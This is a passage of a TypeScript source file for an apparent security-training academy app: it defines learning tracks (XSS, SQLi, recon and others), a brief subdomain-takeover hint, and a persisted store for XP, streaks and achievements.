      'S3 static website hosting: if the bucket does not exist, anyone can claim it.',
      'legacy.acme.com → acme-legacy S3 bucket — if that bucket is unclaimed, it\'s vulnerable.',
    ],
  },
]

export const TRACKS = [
  { id: 'forge' as TrackId,     name: 'FORGE Fundamentals',   description: 'Payload construction, XSS, SQLi, SSRF',    color: '#b026ff', lessons: LESSONS.filter(l => l.trackId === 'forge'),     challenges: CHALLENGES.filter(c => c.trackId === 'forge') },
  { id: 'armory' as TrackId,    name: 'ARMORY Knowledge',      description: 'OWASP, CVSS scoring, bug report writing',   color: '#ff6b35', lessons: LESSONS.filter(l => l.trackId === 'armory'),    challenges: CHALLENGES.filter(c => c.trackId === 'armory') },
  { id: 'crucible' as TrackId,  name: 'CRUCIBLE Training',     description: 'HTTP, auth tokens, API testing',            color: '#26c6ff', lessons: LESSONS.filter(l => l.trackId === 'crucible'),  challenges: CHALLENGES.filter(c => c.trackId === 'crucible') },
  { id: 'labyrinth' as TrackId, name: 'LABYRINTH Expertise',   description: 'Encoding chains, WAF evasion',              color: '#00ff88', lessons: LESSONS.filter(l => l.trackId === 'labyrinth'), challenges: CHALLENGES.filter(c => c.trackId === 'labyrinth') },
  { id: 'recon' as TrackId,     name: 'RECON Ops',             description: 'Subdomain enum, portscan, attack surface',  color: '#ffcc00', lessons: LESSONS.filter(l => l.trackId === 'recon'),     challenges: CHALLENGES.filter(c => c.trackId === 'recon') },
]

// ── Streak helpers ─────────────────────────────────────────────────────────────

function todayISO(): string {
  return new Date().toISOString().slice(0, 10) // "YYYY-MM-DD"
}

function yesterdayISO(): string {
  const d = new Date()
  d.setDate(d.getDate() - 1)
  return d.toISOString().slice(0, 10)
}

/** Multiplier: 1.0 base, +0.1 per streak day, capped at 2.0 */
export function streakMultiplier(streak: number): number {
  return Math.min(2.0, 1.0 + streak * 0.1)
}

// ── Store ─────────────────────────────────────────────────────────────────────

interface AcademyState {
  xp: number
  level: AcademyLevel
  completedLessons: string[]
  completedChallenges: string[]
  achievements: string[]
  streak: number
  lastActiveDate: string
  onboardingComplete: boolean
  challengeHistory: ChallengeHistoryEntry[]
  // XP animation queue: each entry is an amount to animate
  xpGainQueue: number[]

  // Actions
  completeLesson: (lessonId: string) => void
  completeChallenge: (challengeId: string, score: number, time: number) => void
  addXP: (amount: number) => void
  checkAchievements: () => void
  touchStreak: () => void
  setOnboardingComplete: () => void
  popXPGain: () => void
}

export const useAcademyStore = create<AcademyState>()(
  persist(
    (set, get) => ({
      xp: 0,
      level: 'Novice',
      completedLessons: [],
      completedChallenges: [],
      achievements: [],
      streak: 0,
      lastActiveDate: '',
      onboardingComplete: false,
      challengeHistory: [],
      xpGainQueue: [],

      setOnboardingComplete: () => {
        set({ onboardingComplete: true })
      },

      popXPGain: () => {
        set((s) => ({ xpGainQueue: s.xpGainQueue.slice(1) }))
      },

      touchStreak: () => {
        const today = todayISO()
        const yesterday = yesterdayISO()
        const last = get().lastActiveDate
        if (last === today) return // already touched today
        if (last === yesterday) {
          set((s) => ({ streak: s.streak + 1, lastActiveDate: today }))
        } else {
          // gap > 1 day, or first ever
          set({ streak: 1, lastActiveDate: today })
        }
      },

      addXP: (amount) => {
        get().touchStreak()
        const mult = streakMultiplier(get().streak)
        const boosted = Math.round(amount * mult)
        set((state) => {
          const newXP = state.xp + boosted
          return {
            xp: newXP,
            level: getLevel(newXP),
            xpGainQueue: [...state.xpGainQueue, boosted],
          }
        })
        get().checkAchievements()
      },

      completeLesson: (lessonId) => {
        const state = get()
        if (state.completedLessons.includes(lessonId)) return
        const lesson = LESSONS.find(l => l.id === lessonId)
        if (!lesson) return
        set((s) => ({ completedLessons: [...s.completedLessons, lessonId] }))
        get().addXP(lesson.xpReward)
        get().checkAchievements()
      },

      completeChallenge: (challengeId, score, time) => {
        const state = get()
        if (state.completedChallenges.includes(challengeId)) return
        const challenge = CHALLENGES.find(c => c.id === challengeId)
        if (!challenge) return
        const entry: ChallengeHistoryEntry = {
          id: challengeId,
          score,
          time,
          date: new Date().toISOString(),
        }
        set((s) => ({
          completedChallenges: [...s.completedChallenges, challengeId],
          challengeHistory: [...s.challengeHistory, entry],
        }))
        get().addXP(challenge.xpReward)
        get().checkAchievements()
      },

      checkAchievements: () => {
        const state = get()
        const newAchievements: string[] = []

        const add = (id: string) => {
          if (!state.achievements.includes(id) && !newAchievements.includes(id)) {
            newAchievements.push(id)
          }
        }

        if (state.completedChallenges.length >= 1) add('first-blood')
        if (state.completedLessons.length >= 5) add('scholar')
        if (state.completedLessons.length >= 15) add('bookworm')
        if (state.level === 'Master') add('master')

        const forgeChallenges = CHALLENGES.filter(c => c.trackId === 'forge').map(c => c.id)
        if (forgeChallenges.every(id => state.completedChallenges.includes(id))) add('bypass-artist')

        const labChallenges = CHALLENGES.filter(c => c.trackId === 'labyrinth').map(c => c.id)
        if (labChallenges.every(id => state.completedChallenges.includes(id))) add('encoder')

        const armoryChallenges = CHALLENGES.filter(c => c.trackId === 'armory').map(c => c.id)
        if (armoryChallenges.every(id => state.completedChallenges.includes(id))) add('analyst')

        const crucibleChallenges = CHALLENGES.filter(c => c.trackId === 'crucible').map(c => c.id)
        if (crucibleChallenges.every(id => state.completedChallenges.includes(id))) add('pentester')

        const reconChallenges = CHALLENGES.filter(c => c.trackId === 'recon').map(c => c.id)
        if (reconChallenges.every(id => state.completedChallenges.includes(id))) add('recon-pro')

        const speedEntries = state.challengeHistory.filter(h => h.time < 30)
        if (speedEntries.length > 0) add('speed-demon')

        if (newAchievements.length > 0) {
          set((s) => ({ achievements: [...s.achievements, ...newAchievements] }))
        }
      },
    }),
    {
      name: 'daedalus-academy',
      storage: {
        getItem: (key) => {
          const item = localStorage.getItem(key)
          return item ? JSON.parse(item) : null
        },
        setItem: (key, value) => {
          localStorage.setItem(key, JSON.stringify(value))
        },
        removeItem: (key) => {
          localStorage.removeItem(key)
        },
      },
    }
  )
)
